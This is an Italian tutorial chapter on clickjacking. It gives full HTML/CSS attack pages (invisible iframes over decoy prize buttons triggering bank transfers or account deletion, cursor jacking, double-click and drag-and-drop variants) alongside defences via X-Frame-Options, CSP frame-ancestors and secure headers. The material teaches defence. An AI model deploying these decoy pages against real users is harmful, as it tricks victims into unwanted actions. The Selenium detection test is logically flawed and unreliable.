# 19. Clickjacking

## 19.1 Introduzione

**Clickjacking** (UI redressing) inganna l'utente facendogli **cliccare su elementi nascosti** tramite iframe invisibili sovrapposti.

**Impatto:**
- 🔴 Azioni non autorizzate (trasferimenti, acquisti)
- 🔴 Modifica impostazioni account
- 🔴 Attivazione webcam/microfono
- 🔴 Download malware
- 🔴 Social engineering attacks

## 19.2 Attacco Clickjacking

### 19.2.1 - Basic Attack

**Sito attaccante (evil.com):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Vinci un iPhone!</title>
    <style>
        #decoy {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        
        #target-iframe {
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;  /* Invisibile */
            z-index: 2;  /* Sopra il decoy */
            width: 500px;
            height: 500px;
        }
        
        #fake-button {
            position: absolute;
            top: 200px;
            left: 200px;
            width: 150px;
            height: 50px;
            background: red;
            color: white;
            font-size: 20px;
            border: none;
            cursor: pointer;
            z-index: 1;
        }
    </style>
</head>
<body>
    <h1>🎁 CONGRATULAZIONI! HAI VINTO UN iPHONE! 🎁</h1>
    <p>Clicca il pulsante per richiedere il premio!</p>
    
    <!-- Pulsante falso visibile -->
    <button id="fake-button">RICHIEDI PREMIO</button>
    
    <!-- Iframe invisibile sovrapposto -->
    <iframe id="target-iframe" 
            src="https://bank.com/transfer?to=attacker&amount=1000">
    </iframe>
    
    <!-- User pensa di cliccare "RICHIEDI PREMIO" -->
    <!-- In realtà clicca "CONFERMA TRASFERIMENTO" nascosto nell'iframe -->
</body>
</html>
```

**Flusso attacco:**
```
1. Vittima riceve email: "Hai vinto un iPhone!"
2. Clicca link → evil.com
3. Vede pulsante rosso "RICHIEDI PREMIO"
4. Clicca pulsante
5. In realtà clicca iframe invisibile sopra il pulsante
6. Iframe contiene bank.com/transfer
7. Click esegue trasferimento bancario!
8. Soldi inviati all'attaccante
```

### 19.2.2 - Advanced Opacity Attack

**Opacity graduale per evitare sospetti:**

```html
<style>
    #target-iframe {
        position: absolute;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Quasi invisibile ma tecnicamente visibile */
        z-index: 999;
        width: 100%;
        height: 100%;
        border: none;
    }
</style>

<iframe id="target-iframe" src="https://social-network.com/delete-account">
</iframe>

<div style="position: relative; z-index: 1;">
    <h1>Gratis! Scarica eBook</h1>
    <button>Download</button>
</div>

<!-- User clicca "Download" -->
<!-- In realtà clicca "Conferma eliminazione account" -->
```

### 19.2.3 - Cursor Jacking

**Mouse pointer manipulation:**

```html
<style>
    body {
        cursor: none; /* Nasconde cursore reale */
    }
    
    #fake-cursor {
        position: absolute;
        width: 20px;
        height: 20px;
        background: url('cursor.png');
        pointer-events: none;
        z-index: 10000;
    }
    
    #target-iframe {
        position: absolute;
        opacity: 0;
        z-index: 999;
    }
</style>

<div id="fake-cursor"></div>
<iframe id="target-iframe" src="https://site.com/action"></iframe>

<script>
    // Fake cursor offset da posizione reale
    document.addEventListener('mousemove', (e) => {
        const fakeCursor = document.getElementById('fake-cursor');
        fakeCursor.style.left = (e.clientX + 50) + 'px'; // Offset
        fakeCursor.style.top = (e.clientY + 50) + 'px';
    });
    
    // User vede cursore spostato
    // Clicca dove PENSA sia il bottone
    // In realtà clicca altrove (iframe nascosto)
</script>
```

---

## 19.3 Defense: X-Frame-Options

### 19.3.1 - Header X-Frame-Options

**HTTP Header che impedisce embedding in iframe:**

```http
X-Frame-Options: DENY
```

**Valori:**
- **DENY:** Pagina NON può essere embedded in iframe (mai)
- **SAMEORIGIN:** Embedding permesso solo da stesso origin
- **ALLOW-FROM uri:** Embedding permesso solo da URI specifico (deprecato)

**Nginx configuration:**

```nginx
server {
    listen 443 ssl;
    server_name bank.com;
    
    # Impedisci iframe embedding
    add_header X-Frame-Options "DENY" always;
    
    # Oppure permetti solo stesso origin
    # add_header X-Frame-Options "SAMEORIGIN" always;
    
    location / {
        root /var/www/html;
    }
}
```

**Apache configuration:**

```apache
<IfModule mod_headers.c>
    Header always set X-Frame-Options "DENY"
    # oppure
    # Header always set X-Frame-Options "SAMEORIGIN"
</IfModule>
```

**Express.js:**

```javascript
const express = require('express');
const app = express();

// Manuale
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});

// Oppure usa helmet
const helmet = require('helmet');

app.use(helmet.frameguard({ action: 'deny' }));
// oppure
app.use(helmet.frameguard({ action: 'sameorigin' }));

app.get('/', (req, res) => {
    res.send('Protected from clickjacking');
});

app.listen(3000);
```

**Test:**

```html
<!-- evil.com prova iframe -->
<iframe src="https://bank.com"></iframe>

<!-- Browser blocca e mostra errore:
     "Refused to display 'https://bank.com' in a frame 
      because it set 'X-Frame-Options' to 'deny'."
-->
```

### 19.3.2 - Content Security Policy (CSP)

**CSP frame-ancestors è il successore moderno di X-Frame-Options:**

```nginx
# Nginx
add_header Content-Security-Policy "frame-ancestors 'none'" always;

# Oppure permetti solo stesso origin
# add_header Content-Security-Policy "frame-ancestors 'self'" always;

# Oppure permetti domini specifici
# add_header Content-Security-Policy "frame-ancestors 'self' https://trusted-site.com" always;
```

**Express.js con helmet:**

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        frameAncestors: ["'none'"]  // Blocca tutti gli iframe
        // oppure
        // frameAncestors: ["'self'"]  // Solo stesso origin
        // oppure
        // frameAncestors: ["'self'", "https://trusted.com"]
    }
}));
```

**HTTP Response:**

```http
HTTP/2 200 OK
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY

<!-- Doppia protezione (CSP + X-Frame-Options) -->
```

**Valori frame-ancestors:**

```
'none'           → Mai in iframe
'self'           → Solo stesso origin
https://site.com → Solo da site.com
* → Qualsiasi (NON usare!)
```

---

## 19.4 JavaScript Framebusting

### 19.4.1 - Client-side Protection

**Legacy technique (NON affidabile da sola):**

```html
<script>
    // Verifica se pagina è in iframe
    if (window.top !== window.self) {
        // Siamo in iframe! Break out
        window.top.location = window.self.location;
    }
</script>
```

**Problema:** Attaccante può bypassare:

```html
<!-- evil.com -->
<iframe sandbox="allow-forms allow-scripts" 
        src="https://bank.com">
</iframe>

<!-- sandbox attribute disabilita top navigation -->
<!-- Framebusting script fallisce -->
```

**Framebusting avanzato:**

```javascript
<script>
    // Anti-framebusting killer
    (function() {
        if (window.top !== window.self) {
            try {
                // Prova a break out
                window.top.location = window.self.location;
            } catch (e) {
                // Se fallisce, nascondi contenuto
                document.body.innerHTML = 
                    '<h1>Questa pagina non può essere visualizzata in un frame.</h1>';
                
                // Oppure blocca interazione
                document.body.style.pointerEvents = 'none';
                document.body.style.opacity = '0.3';
            }
        }
    })();
</script>
```

**✅ MEGLIO: Usa header HTTP (X-Frame-Options / CSP)**

---

## 19.5 Advanced Attacks

### 19.5.1 - Double Clickjacking

**Click multipli concatenati:**

```html
<style>
    #iframe1, #iframe2 {
        position: absolute;
        opacity: 0;
        z-index: 999;
    }
    
    #iframe1 { top: 100px; left: 100px; }
    #iframe2 { top: 200px; left: 200px; }
</style>

<h1>Gioca e vinci!</h1>
<button style="position: absolute; top: 100px; left: 100px;">
    Click 1
</button>
<button style="position: absolute; top: 200px; left: 200px;">
    Click 2
</button>

<iframe id="iframe1" src="https://bank.com/transfer-step1"></iframe>
<iframe id="iframe2" src="https://bank.com/transfer-confirm"></iframe>

<!-- User clicca due pulsanti "gioco" -->
<!-- In realtà completa trasferimento 2-step -->
```

### 19.5.2 - Drag & Drop Clickjacking

**File upload via drag-and-drop:**

```html
<style>
    #drop-zone {
        width: 300px;
        height: 200px;
        border: 2px dashed #ccc;
        text-align: center;
        padding: 50px;
    }
    
    #hidden-iframe {
        position: absolute;
        top: 0;
        left: 0;
        opacity: 0;
        z-index: 999;
        width: 300px;
        height: 200px;
    }
</style>

<div id="drop-zone">
    📁 Trascina file qui per caricare
</div>

<iframe id="hidden-iframe" 
        src="https://cloud-storage.com/upload-public">
</iframe>

<!-- User trascina file privati -->
<!-- In realtà upload a storage pubblico dell'attaccante -->
```

---

## 19.6 Detection & Prevention

### 19.6.1 - Browser DevTools Detection

**User può verificare clickjacking:**

```
1. F12 → DevTools
2. Elements tab
3. Cerca iframe nascosti
4. Verifica opacity, z-index
5. Se opacity: 0 o z-index molto alto → sospetto!
```

### 19.6.2 - Automated Testing

**Selenium test per X-Frame-Options:**

```python
from selenium import webdriver
from selenium.common.exceptions import WebDriverException

def test_clickjacking_protection(url):
    driver = webdriver.Chrome()
    
    # HTML con iframe
    html = f'''
    <html>
    <body>
        <iframe src="{url}"></iframe>
    </body>
    </html>
    '''
    
    driver.get('data:text/html,' + html)
    
    try:
        # Prova accedere iframe
        iframe = driver.find_element_by_tag_name('iframe')
        driver.switch_to.frame(iframe)
        
        print(f"❌ {url} vulnerable to clickjacking")
        return False
    except WebDriverException:
        print(f"✅ {url} protected from clickjacking")
        return True
    finally:
        driver.quit()

# Test
test_clickjacking_protection('https://bank.com')
```

**HTTP Header check:**

```bash
# curl check X-Frame-Options
curl -I https://bank.com | grep -i "x-frame-options"

# Output atteso:
# X-Frame-Options: DENY

# Check CSP
curl -I https://bank.com | grep -i "content-security-policy"

# Output atteso:
# Content-Security-Policy: frame-ancestors 'none'
```

---

## 19.7 Best Practices

### 19.7.1 - Checklist Protection

**Server-side:**
```
✅ X-Frame-Options: DENY (o SAMEORIGIN)
✅ CSP: frame-ancestors 'none' (o 'self')
✅ Security headers su tutte le risposte
✅ HTTPS obbligatorio
✅ Test automatici (CI/CD)
```

**Code review:**
```
✅ Verifica sensitive actions (transfer, delete, etc.)
✅ Richiedi conferma per azioni critiche
✅ Multi-step verification
✅ Re-authentication per azioni sensibili
```

**User education:**
```
✅ Avvisa utenti su phishing
✅ Verifica sempre URL before action
✅ Attenzione a siti che chiedono "click multipli"
✅ Usa browser moderni (auto-protection)
```

### 19.7.2 - Complete Secure Headers

**Nginx comprehensive config:**

```nginx
server {
    listen 443 ssl http2;
    server_name bank.com;
    
    # SSL config
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # Security Headers
    
    # Clickjacking protection
    add_header X-Frame-Options "DENY" always;
    add_header Content-Security-Policy "frame-ancestors 'none'" always;
    
    # XSS protection
    add_header X-XSS-Protection "1; mode=block" always;
    add_header X-Content-Type-Options "nosniff" always;
    
    # HTTPS enforcement
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    
    # Referrer policy
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Permissions policy
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
    
    location / {
        root /var/www/html;
    }
}
```

**Express.js with helmet:**

```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Comprehensive security headers
app.use(helmet({
    // Clickjacking
    frameguard: { action: 'deny' },
    
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            frameAncestors: ["'none'"],  // Clickjacking
            objectSrc: ["'none'"],
            upgradeInsecureRequests: []
        }
    },
    
    // HSTS
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    
    // Other security headers
    noSniff: true,
    xssFilter: true,
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' }
}));

app.get('/', (req, res) => {
    res.send('Fully protected application');
});

app.listen(3000);
```

**Verify headers:**

```bash
curl -I https://bank.com

HTTP/2 200 OK
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Referrer-Policy: strict-origin-when-cross-origin
```

---

**Capitolo 19 completato!**

Prossimo: **Capitolo 20 - Information Disclosure**
